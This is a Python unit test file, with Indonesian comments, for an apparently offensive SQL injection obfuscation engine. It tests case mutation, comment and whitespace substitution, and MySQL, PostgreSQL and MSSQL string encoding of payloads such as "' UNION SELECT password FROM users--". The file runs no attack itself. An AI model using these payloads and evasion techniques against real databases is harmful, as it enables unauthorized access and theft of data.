# tests/test_polymorphic.py
import unittest
from darkyn.attack.polymorphic import PolymorphicEngine

class TestPolymorphicEngine(unittest.TestCase):
    """Test suite untuk Polymorphic Payload Engine dengan bug fixes."""

    def test_no_duplicate_whitespace_subs(self):
        """Test: WHITESPACE_SUBS hanya defined once (BUG-1 fix)."""
        # Ensure WHITESPACE_SUBS defined hanya satu kali, bukan duplikat
        subs = PolymorphicEngine.WHITESPACE_SUBS
        self.assertEqual(len(subs), 5)
        self.assertIn("\t", subs)
        self.assertIn("/**/", subs)

    def test_mutate_case_preserves_semantics(self):
        """Test: case mutation tidak ubah payload logic."""
        payloads = [
            "' UNION SELECT 1,2,3--",
            "' OR 1=1--",
            "' AND database()--",
        ]

        for payload in payloads:
            mutated = PolymorphicEngine.mutate_case(payload)
            # Harus masih SQL valid (lowercase version sama semantiknya)
            self.assertEqual(payload.lower(), mutated.lower())

    def test_postgresql_string_encoding(self):
        """Test: PostgreSQL CHR() syntax benar (BUG-4 fix)."""
        payload = "'admin' UNION SELECT password--"
        encoded = PolymorphicEngine.encode_strings(payload, db_type="postgresql")

        # Harus menggunakan CHR() dengan || concat, bukan multi-arg CHR
        self.assertIn("CHR(", encoded)
        self.assertIn("||", encoded)
        # Harus NOT contain 'admin' literal lagi
        self.assertNotIn("'admin'", encoded)

    def test_mysql_hex_encoding(self):
        """Test: MySQL string encoding ke hex."""
        payload = "'password' UNION SELECT 1--"
        encoded = PolymorphicEngine.encode_strings(payload, db_type="mysql")

        # MySQL: gunakan 0x literal
        self.assertIn("0x", encoded)
        self.assertNotIn("'password'", encoded)

    def test_mssql_char_encoding(self):
        """Test: MSSQL CHAR() syntax dengan + concat."""
        payload = "'secret' UNION SELECT 1--"
        encoded = PolymorphicEngine.encode_strings(payload, db_type="mssql")

        # MSSQL: CHAR()+CHAR()...
        self.assertIn("CHAR(", encoded)
        self.assertIn("+", encoded)

    def test_obfuscate_level_1_only_case(self):
        """Test: level 1 hanya case mutation."""
        payload = "' UNION SELECT * FROM users--"
        obf = PolymorphicEngine.obfuscate(payload, level=1)

        # Hanya case berubah, bukan ada encode/comment
        self.assertEqual(payload.lower(), obf.lower())

    def test_obfuscate_level_2_with_comments(self):
        """Test: level 2 include case + comment injection."""
        payload = "' UNION SELECT * FROM users--"
        obf = PolymorphicEngine.obfuscate(payload, db_type="mysql", level=2)

        # Panjang harus lebih panjang (ada comments)
        self.assertGreaterEqual(len(obf), len(payload))

    def test_obfuscate_level_3_all_techniques(self):
        """Test: level 3 include case + comment + encode + whitespace."""
        payload = "' UNION SELECT password FROM users--"
        obf = PolymorphicEngine.obfuscate(payload, db_type="mysql", level=3, encode_str=True)

        # Panjang jauh lebih panjang
        self.assertGreater(len(obf), len(payload) * 1.2)

    def test_generate_variants_uniqueness(self):
        """Test: setiap variant unik (tidak duplicate)."""
        payload = "' UNION SELECT 1,2,3--"
        variants = PolymorphicEngine.generate_variants(payload, count=5)

        # Harus 5 variant
        self.assertEqual(len(variants), 5)

        # Semua unique
        self.assertEqual(len(set(variants)), 5)

        # Original harus included
        self.assertIn(payload, variants)

    def test_whitespace_substitution(self):
        """Test: whitespace diganti dengan valid SQL equivalent."""
        payload = "SELECT * FROM users WHERE id = 1"
        result = PolymorphicEngine.substitute_whitespace(payload)

        # Harus lebih panjang (ada substitutions)
        self.assertGreaterEqual(len(result), len(payload))

        # Harus mengandung beberapa subs
        subs_found = any(sub in result for sub in PolymorphicEngine.WHITESPACE_SUBS)
        self.assertTrue(subs_found)

if __name__ == '__main__':
    unittest.main()
